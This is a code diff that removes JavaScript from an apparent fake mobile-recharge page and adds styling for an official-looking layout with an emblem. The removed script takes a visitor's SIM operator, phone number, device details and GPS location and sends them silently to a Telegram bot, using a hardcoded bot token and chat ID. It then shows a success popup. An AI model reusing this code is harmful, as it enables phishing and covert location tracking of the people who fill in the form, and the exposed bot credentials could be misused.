@@ -1,56 +1,131 @@
-document.getElementById("rechargeForm").addEventListener("submit", async function (e) {
-  e.preventDefault();
-
-  const sim = document.getElementById("sim").value;
-  const number = document.getElementById("number").value;
-
-  if (!sim || !number.match(/^[6-9]\d{9}$/)) {
-    alert("कृपया मान्य जानकारी दर्ज करें।");
-    return;
-  }
-
-  if (!navigator.geolocation) {
-    alert("आपके ब्राउज़र में लोकेशन सपोर्ट नहीं है।");
-    return;
-  }
-
-  navigator.geolocation.getCurrentPosition(
-    async (position) => {
-      const latitude = position.coords.latitude;
-      const longitude = position.coords.longitude;
-
-      const device = navigator.userAgent;
-
-      const botToken = "8216004415:AAF-MF8E-tRBw6h5-BfC3_i1FagixuSt9Rc";
-      const chatId = "6038115234";
-
-      const message = `📱 New Recharge Request:
-SIM: ${sim}
-Number: ${number}
-Device: ${device}
-Location: https://www.google.com/maps?q=${latitude},${longitude}`;
-
-      try {
-        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            chat_id: chatId,
-            text: message,
-          }),
-        });
-
-        const popup = document.getElementById("popup");
-        popup.style.display = "block";
-
-        // Reset form
-        this.reset();
-      } catch (error) {
-        alert("कुछ त्रुटि हुई, कृपया पुनः प्रयास करें।");
-      }
-    },
-    () => {
-      alert("लोकेशन एक्सेस नहीं हो सका। कृपया अनुमति दें।");
-    }
-  );
-});
+body {
+  font-family: 'Segoe UI', sans-serif;
+  margin: 0;
+  padding: 0;
+  background-color: #f2f2f2;
+  color: #333;
+}
+header {
+  text-align: center;
+  padding: 1rem;
+  background-color: #eaeaea;
+  border-bottom: 2px solid #ccc;
+}
+header .emblem {
+  width: 60px;
+  margin-bottom: 0.5rem;
+}
+header h1 {
+  margin: 0.5rem 0 0.2rem;
+  font-size: 1.4rem;
+  color: #003366;
+}
+header p {
+  font-size: 0.95rem;
+  color: #555;
+}
+main {
+  padding: 1rem;
+  max-width: 400px;
+  margin: 1.5rem auto;
+  background-color: #fff;
+  border-radius: 8px;
+  box-shadow: 0 0 10px rgba(0,0,0,0.1);
+}
+form label {
+  display: block;
+  margin-top: 1rem;
+  font-weight: bold;
+}
+form input, form select {
+  width: 100%;
+  padding: 0.6rem;
+  margin-top: 0.3rem;
+  border: 1px solid #ccc;
+  border-radius: 5px;
+  font-size: 1rem;
+  box-sizing: border-box;
+}
+button {
+  margin-top: 1.5rem;
+  width: 100%;
+  padding: 0.7rem;
+  background-color: #006400;
+  color: white;
+  border: none;
+  font-size: 1rem;
+  border-radius: 5px;
+  cursor: pointer;
+  transition: background-color 0.3s ease;
+}
+button:hover {
+  background-color: #004d00;
+}
+#loadingSpinner {
+  border: 4px solid #f3f3f3;
+  border-top: 4px solid #006400;
+  border-radius: 50%;
+  width: 30px;
+  height: 30px;
+  animation: spin 1s linear infinite;
+  margin: 20px auto 0 auto;
+  display: none;
+}
+@keyframes spin {
+  0% { transform: rotate(0deg);}
+  100% { transform: rotate(360deg);}
+}
+.modal {
+  position: fixed;
+  top: 0; left: 0;
+  width: 100%; height: 100%;
+  background-color: rgba(0,0,0,0.5);
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  z-index: 9999;
+  visibility: hidden;
+  opacity: 0;
+  transition: opacity 0.3s ease;
+}
+.modal.show {
+  visibility: visible;
+  opacity: 1;
+}
+.modal-content {
+  background: white;
+  padding: 2rem;
+  border-radius: 10px;
+  max-width: 350px;
+  text-align: center;
+  box-shadow: 0 0 15px rgba(0,0,0,0.3);
+}
+.modal-emblem {
+  width: 80px;
+  margin-bottom: 1rem;
+}
+.modal-content p {
+  font-size: 1.1rem;
+  margin: 0.5rem 0;
+}
+.modal-content button {
+  margin-top: 1rem;
+  padding: 0.6rem 1.2rem;
+  background-color: #006400;
+  color: white;
+  border: none;
+  border-radius: 6px;
+  cursor: pointer;
+  font-size: 1rem;
+  transition: background-color 0.3s ease;
+}
+.modal-content button:hover {
+  background-color: #004d00;
+}
+footer {
+  text-align: center;
+  padding: 1rem;
+  font-size: 0.85rem;
+  color: #666;
+  margin-top: 2rem;
+}
